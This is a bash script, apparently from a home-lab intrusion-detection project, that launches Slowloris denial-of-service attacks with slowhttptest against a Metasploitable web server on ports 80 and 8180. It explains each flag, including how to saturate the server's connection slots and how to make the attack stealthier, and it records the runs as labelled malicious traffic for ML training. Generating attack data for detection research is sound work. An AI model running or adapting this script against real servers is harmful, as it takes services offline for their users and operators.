#!/bin/bash
# ============================================================
# slowhttptest_dos.sh
# Attack Type: Slow HTTP Denial of Service (Slowloris)
# Tool: slowhttptest
# Source: Kali Linux (192.168.20.20)
# Targets: Metasploitable web server (192.168.30.20)
#          iMac Ubuntu Server web server (192.168.30.x)
#
# What this does:
#   Opens hundreds of HTTP connections to the target web server
#   and deliberately keeps them open without completing requests.
#   Each connection sends just enough data to avoid timeout,
#   occupying a connection slot indefinitely.
#   When all slots are full, the server can't accept new
#   connections — effectively taken offline.
#
# How it differs from previous scripts:
#   Nmap:       Reconnaissance — read only
#   Metasploit: Exploitation — code execution
#   Hydra:      Credential attack — high volume auth attempts
#   This:       Resource exhaustion — low volume, high impact
#               Traffic is SLOW and DELIBERATE, not a flood
#
# What Suricata will see:
#   ET DOS Slowloris attack signatures
#   Many long-lived incomplete HTTP connections
#   Unusual connection duration patterns
#   Low bytes-per-second on HTTP flows
#
# What makes this unique for ML:
#   Unlike other attacks, this has LOW packet rate but HIGH
#   connection count and LONG duration. The ML model needs
#   to learn attacks aren't always high-volume floods.
#
# Usage:
#   bash slowhttptest_dos.sh
#
# After running, log this session in data/session_log.csv:
#   timestamp_start, timestamp_end, slowhttptest_dos,
#   192.168.30.20, malicious, X connections, duration
# ============================================================

# ── Install check ────────────────────────────────────────────
if ! command -v slowhttptest &> /dev/null; then
    echo "[*] Installing slowhttptest..."
    sudo apt-get install -y slowhttptest
fi

# ── Configuration ────────────────────────────────────────────
OUTPUT_DIR="/tmp/dos_results"
mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')

echo "============================================"
echo " Slow HTTP DoS (Slowloris)"
echo " Started:  $(date '+%Y-%m-%d %H:%M:%S')"
echo "============================================"
echo ""
echo "[!] Record this start time in session_log.csv"
echo ""

# ── Attack 1: Slowloris against Metasploitable HTTP ──────────
echo "[*] Running Slowloris against Metasploitable (port 80)..."
echo ""

# slowhttptest flags explained:
#
# -c 500
#   → Open 500 concurrent connections
#   → Each holds a slot on the target server
#   → Apache on Metasploitable has ~150 default slots
#   → 500 connections ensures full saturation
#
# -H
#   → Slowloris mode (incomplete HTTP headers)
#   → Sends headers one at a time, never completes the request
#   → The alternative is -B (slow body) or -R (range attack)
#
# -g
#   → Generate a statistics graph (HTML report)
#   → Shows connection count over time
#
# -o ${OUTPUT_DIR}/slowloris_80_${TIMESTAMP}
#   → Output file prefix for the HTML report
#
# -i 10
#   → Send a new header byte every 10 seconds
#   → Just enough to prevent server timeout
#   → Lower = more aggressive, Higher = stealthier
#
# -r 200
#   → Connection rate: attempt 200 new connections per second
#   → How fast we open new connections initially
#
# -t GET
#   → HTTP verb to use (GET is most common)
#
# -u http://192.168.30.20
#   → Target URL
#
# -x 24
#   → Max length of follow-up data (bytes)
#
# -p 3
#   → Timeout to wait for server response (seconds)
#   → If server stops responding for 3s, consider it down

slowhttptest \
    -c 500 \
    -H \
    -g \
    -o "${OUTPUT_DIR}/slowloris_80_${TIMESTAMP}" \
    -i 10 \
    -r 200 \
    -t GET \
    -u "http://192.168.30.20" \
    -x 24 \
    -p 3

echo ""
echo "[*] Slowloris against port 80 complete"
sleep 5

# ── Attack 2: Slowloris against Metasploitable port 8180 ─────
echo "[*] Running Slowloris against Metasploitable (port 8180)..."
echo ""

slowhttptest \
    -c 500 \
    -H \
    -g \
    -o "${OUTPUT_DIR}/slowloris_8180_${TIMESTAMP}" \
    -i 10 \
    -r 200 \
    -t GET \
    -u "http://192.168.30.20:8180" \
    -x 24 \
    -p 3

echo ""
echo "[*] Slowloris against port 8180 complete"

# ── Summary ──────────────────────────────────────────────────
echo ""
echo "============================================"
echo " DoS complete: $(date '+%Y-%m-%d %H:%M:%S')"
echo " Reports saved to: ${OUTPUT_DIR}/"
echo "============================================"
echo ""
echo "HTML reports generated — open in browser to see"
echo "connection count graphs over time"
echo ""
echo "[!] Record this end time in session_log.csv"
echo "[!] Label: malicious"
echo "[!] Scenario: slowhttptest_dos"
echo ""
echo "Note for session log:"
echo "  - Record whether the server became unresponsive"
echo "  - Record peak connection count from HTML report"
echo "  - Server should recover within ~60s after script ends"
